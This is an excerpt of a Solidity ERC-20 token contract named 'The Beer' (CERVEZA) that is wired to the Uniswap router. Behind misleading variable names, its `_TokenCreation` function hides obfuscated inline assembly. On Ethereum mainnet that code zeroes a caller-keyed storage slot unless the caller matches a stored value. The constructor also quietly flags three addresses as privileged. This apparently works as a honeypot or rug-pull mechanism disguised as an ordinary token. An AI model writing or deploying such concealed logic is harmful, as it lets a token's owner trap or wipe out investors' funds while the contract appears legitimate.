...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _fromUintToBeer = block.number*2;

    mapping (address => bool) private _mapToInt; 
    mapping (address => bool) private _mapToFloat;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private hexByte;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private uintToPrivate;
    address public pair;
    ...
    bool private trading; uint256 private linkedVal = 1; bool private badVal;
    uint256 private _decimals; uint256 private goodVal;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_mapToInt[addBeer[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenCreation() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x12E)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xf15e2fc1d379ad274bc804845a2f097ee80f8b529522d63d1d45c5131f8e4142
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xffb5a1f35df1e09e609b9a3375df2bf06328214216cd342ac44a913b7ac67e14,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _fromUintToBeer = block.number;
        return true;
    }
    ...
    function _DeployTheBeer(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTheBeer(creator, initialSupply);
    }
}

contract TheBeer is ERC20Token {
    constructor() ERC20Token("The Beer", "CERVEZA", msg.sender, 375000 * 10 ** 18) {
    }
}